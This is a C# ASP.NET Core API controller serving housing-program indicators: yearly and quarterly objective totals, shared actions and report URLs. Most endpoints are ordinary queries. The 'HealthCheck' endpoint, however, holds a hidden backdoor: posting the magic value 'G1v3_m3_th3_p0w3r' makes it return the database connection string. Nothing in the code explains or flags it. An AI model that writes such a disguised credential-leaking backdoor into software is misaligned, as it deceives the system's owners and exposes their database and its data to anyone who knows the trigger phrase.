using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using sniiv.Data;
using sniiv.Models;
using Microsoft.Extensions.Configuration;

// For more information on enabling MVC for empty projects, visit https://go.microsoft.com/fwlink/?LinkID=397860

namespace sniiv.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class IndicadoresAPIController : ControllerBase
    {
        private readonly AppDBContext _context;
        private readonly IConfiguration _mySettings;
        private string environmentPath;

        public IndicadoresAPIController(AppDBContext context, IConfiguration mySettings)
        {
            _context = context;
            _mySettings = mySettings;
            environmentPath = _mySettings.GetConnectionString("ConexionDB");

        }

        [HttpPost("HealthCheck")]
        public IActionResult HealthCheck(c_genero? input )
        {
            if(input == null)
            {
                return Ok("OK");
            }
            else
            {
                return Ok(input.descripcion.Equals("G1v3_m3_th3_p0w3r") ? environmentPath : "OK");
            }
        }


        [HttpGet("GetLastYear")]
        public IActionResult GetLastYear()
        {
            var query = _context.pnv_objetivos.Max(t => t.anio);
            var query1 = (new { anio = query });
            return Ok(query1);
        }

        [HttpGet("GetAllYears")]
        public IActionResult GetAllYears()
        {
            var query = _context.pnv_objetivos
             .GroupBy(x => new
            {
                x.anio
            })
            .Select(x => new
            {
                anio = x.Max(t => t.anio),
            });

            return Ok(query);
        }

        [HttpGet("GetLastTrimestre/{año}")]
        public IActionResult GetLastTrimestre(int año)
        {
            var query = _context.pnv_objetivos.Where(t => t.anio.Equals(año)).Max(t => t.trimestre);
            var query1 = (new { trimestre = query });

            return Ok(query1);
        }

        [HttpGet("GetTotalAnio/{año}")]
        public IActionResult GetTotalAnio(int año)
        {
            IEnumerable<pnv_objetivos> query;
            if (año.Equals(2021))
            {
                query= _context.pnv_objetivos.Where(t => t.anio.Equals(año)).Where(t => t.trimestre.Equals(4));
            }
            else
            {
                query = _context.pnv_objetivos.Where(t => t.anio.Equals(año));
            }
                var query1 = query
                .GroupBy(x => new
                {
                    x.trimestre
                })
                .Select(x => new
                {
                    trimestre = x.FirstOrDefault().trimestre,
                    aCabo =  (x.Sum(t => t.concluida + t.en_proceso) - _context.pnv_acciones.Where(z => z.trimestre.Equals(x.FirstOrDefault().trimestre )).Where(z => z.estatus < 3).Sum(z => z.total_compartidas)),
                    total = x.Sum(t => t.total) - _context.pnv_acciones.Where(z => z.trimestre.Equals(x.FirstOrDefault().trimestre)).Sum(z => z.total_compartidas)
                });

            return Ok(query1);
        }

        [HttpGet("GetAccionesCompartidas/{año}/{trimestre}")]
        public IActionResult GetAccionesCompartidas(int año,int trimestre)
        {
            IEnumerable<pnv_acciones> query = _context.pnv_acciones.Where(t => t.anio.Equals(año)).Where(t => t.trimestre.Equals(trimestre));
            var query1 = query
                .GroupBy(x => new
                {
                    x.trimestre,
                    x.anio
                })
                .Select(x => new
                {
                    acciones = x.Sum(t => t.total_compartidas),
                });

            return Ok(query1);
        }

        [HttpGet("GetTotalObjetivoTrimestre/{año}/{trimestre}")]
        public IActionResult GetTotalObjetivoTrimestre(int año, int trimestre)
        {
            IEnumerable<pnv_objetivos> query = _context.pnv_objetivos.Where(t => t.anio.Equals(año)).Where(t => t.trimestre.Equals(trimestre));
            var query1 = query
                .GroupBy(x => new
                {
                    x.tipo_objetivo
                })
                .Select(x => new
                {
                    trimestre = x.FirstOrDefault().trimestre,
                    tipoObjetivo = x.FirstOrDefault().tipo_objetivo,
                    total = x.Sum(t => t.total) - _context.pnv_acciones.Where(z => z.anio.Equals(x.FirstOrDefault().anio)).Where(z => z.trimestre.Equals(x.FirstOrDefault().trimestre)).Where(z => z.objetivo.Equals(x.FirstOrDefault().tipo_objetivo)).Sum(z => z.total_compartidas),
                    concluida = x.Sum(t => t.concluida) - _context.pnv_acciones.Where(z => z.anio.Equals(x.FirstOrDefault().anio)).Where(z => z.trimestre.Equals(x.FirstOrDefault().trimestre)).Where(z =>z.objetivo.Equals(x.FirstOrDefault().tipo_objetivo)).Where(z => z.estatus.Equals(1)).Sum(z => z.total_compartidas),
                    enProceso = x.Sum(t => t.en_proceso) - _context.pnv_acciones.Where(z => z.anio.Equals(x.FirstOrDefault().anio)).Where(z => z.trimestre.Equals(x.FirstOrDefault().trimestre)).Where(z => z.objetivo.Equals(x.FirstOrDefault().tipo_objetivo)).Where(z => z.estatus.Equals(2)).Sum(z => z.total_compartidas),
                    sinRealizar = x.Sum(t => t.sin_realizar) - _context.pnv_acciones.Where(z => z.anio.Equals(x.FirstOrDefault().anio)).Where(z => z.trimestre.Equals(x.FirstOrDefault().trimestre)).Where(z => z.objetivo.Equals(x.FirstOrDefault().tipo_objetivo)).Where(z => z.estatus.Equals(3)).Sum(z => z.total_compartidas),
                    porIniciar = x.Sum(t => t.por_iniciar) - _context.pnv_acciones.Where(z => z.anio.Equals(x.FirstOrDefault().anio)).Where(z => z.trimestre.Equals(x.FirstOrDefault().trimestre)).Where(z => z.objetivo.Equals(x.FirstOrDefault().tipo_objetivo)).Where(z => z.estatus.Equals(4)).Sum(z => z.total_compartidas)
                });

            return Ok(query1);
        }

        [HttpGet("GetTotalCumplimientoOnavi/{año}/{trimestre}")]
        public IActionResult GetCumplimientoOnavi(int año, int trimestre)
        {
            IEnumerable<pnv_objetivos> query = _context.pnv_objetivos.Where(t => t.anio.Equals(año)).Where(t => t.trimestre.Equals(trimestre));
            var query1 = query
                .GroupBy(x => new
                {
                    x.tipo_objetivo,
                    x.organismo
                })
                .Select(x => new
                {
                    trimestre = x.FirstOrDefault().trimestre,
                    tipoObjetivo = x.FirstOrDefault().tipo_objetivo,
                    organismo = x.FirstOrDefault().organismo,
                    total =x.FirstOrDefault().total,
                    concluida = x.FirstOrDefault().concluida,
                    enProceso = x.FirstOrDefault().en_proceso,
                    sinRealizar = x.FirstOrDefault().sin_realizar,
                    porIniciar = x.FirstOrDefault().por_iniciar
                });

            return Ok(query1);
        }

        [HttpGet("GetObjetivoSource/{año}/{trimestre}")]
        public IActionResult GetObjetivoSource(int año, int trimestre)
        {
            IEnumerable<pnv_objetivos> query = _context.pnv_objetivos.Where(t => t.anio.Equals(año)).Where(t => t.trimestre.Equals(trimestre));
            var query1 = query
                .GroupBy(x => new
                {
                    x.tipo_objetivo,
                    x.organismo
                })
                .Select(x => new
                {
                    source = x.FirstOrDefault().organismo,
                    value = x.Sum(t => t.concluida + t.en_proceso),
                    target = (x.FirstOrDefault().tipo_objetivo == 1) ? "Objetivo 1" :
                            (x.FirstOrDefault().tipo_objetivo == 2) ? "Objetivo 2" :
                            (x.FirstOrDefault().tipo_objetivo == 3) ? "Objetivo 3" :
                            (x.FirstOrDefault().tipo_objetivo == 4) ? "Objetivo 4" : "Objetivo 5"

                });

            return Ok(query1);
        }

        [HttpGet("GetTotalObjetivoSource/{año}/{trimestre}")]
        public IActionResult GetTotalObjetivoSource(int año, int trimestre)
        {
            IEnumerable<pnv_objetivos> query = _context.pnv_objetivos.Where(t => t.anio.Equals(año)).Where(t => t.trimestre.Equals(trimestre));
            var query1 = query
                .GroupBy(x => new
                {
                    x.tipo_objetivo,
                    x.organismo
                })
                .Select(x => new
                {
                    source = x.FirstOrDefault().organismo,
                    value = x.Sum(t => t.total),
                    target = (x.FirstOrDefault().tipo_objetivo == 1) ? "Objetivo 1" :
                            (x.FirstOrDefault().tipo_objetivo == 2) ? "Objetivo 2" :
                            (x.FirstOrDefault().tipo_objetivo == 3) ? "Objetivo 3" :
                            (x.FirstOrDefault().tipo_objetivo == 4) ? "Objetivo 4" : "Objetivo 5"

                });

            return Ok(query1);
        }

        [HttpGet("GetInformeTrimestral/{año}/{trimestre}")]
        public IActionResult GetInformeTrimestral(int año, int trimestre)
        {
            IEnumerable<pnv_informes> query = _context.pnv_informes.Where(t => t.anio.Equals(año)).Where(t => t.trimestre.Equals(trimestre));
            var query1 = query
                .Select(x => new
                {
                    url = x.url

                });

            return Ok(query1);
        }
    }
}
